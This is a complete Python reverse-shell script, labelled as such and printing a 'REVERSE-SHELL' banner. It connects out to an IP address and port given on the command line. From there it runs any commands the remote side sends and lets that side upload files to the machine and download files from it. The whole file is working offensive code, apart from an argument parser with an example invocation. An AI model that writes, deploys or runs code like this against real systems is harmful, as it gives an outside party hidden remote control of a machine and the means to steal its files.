import socket
import subprocess
import os
import argparse

def show_banner():
    banner = """
 ██████╗ ███████╗██╗   ██╗███████╗██████╗ ███████╗███████╗    ███████╗██╗  ██╗███████╗██╗     ██╗     
██╔══██╗██╔════╝██║   ██║██╔════╝██╔══██╗██╔════╝██╔════╝    ██╔════╝██║  ██║██╔════╝██║     ██║     
██████╔╝█████╗  ██║   ██║█████╗  ██████╔╝███████╗█████╗█████╗███████╗███████║█████╗  ██║     ██║     
██╔══██╗██╔══╝  ╚██╗ ██╔╝██╔══╝  ██╔══██╗╚════██║██╔══╝╚════╝╚════██║██╔══██║██╔══╝  ██║     ██║     
██║  ██║███████╗ ╚████╔╝ ███████╗██║  ██║███████║███████╗    ███████║██║  ██║███████╗███████╗███████╗
╚═╝  ╚═╝╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝    ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
    """
    print(banner, flush=True)

def main(target_ip, target_port):
    show_banner()
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))
    
    while True:
        command = s.recv(1024).decode()

        if command.lower() == 'exit':
            break
        elif command[:6] == 'upload':
            filename = command[7:]
            with open(filename, 'wb') as f:
                data = s.recv(4096)
                while data:
                    f.write(data)
                    data = s.recv(4096)
            s.send(str.encode('File uploaded successfully\n'))
        elif command[:8] == 'download':
            filename = command[9:]
            if os.path.exists(filename):
                with open(filename, 'rb') as f:
                    data = f.read(4096)
                    while data:
                        s.send(data)
                        data = f.read(4096)
                s.send(str.encode('File downloaded successfully\n'))
            else:
                s.send(str.encode('File not found\n'))
        elif command[:2] == 'cd':
            os.chdir(command[3:])
            s.send(str.encode(os.getcwd() + '> '))
        else:
            output = subprocess.getoutput(command)
            s.send(str.encode(output + '\n'))
    
    s.close()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Reverse Shell Script",
        epilog="""
Example usage:
  python reverse_shell.py 192.168.1.100 4444

This will connect to the target machine at 192.168.1.100 on port 4444.
""",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument("target_ip", help="Target IP address")
    parser.add_argument("target_port", type=int, help="Target Port")
    args = parser.parse_args()
    
    show_banner()
    main(args.target_ip, args.target_port)
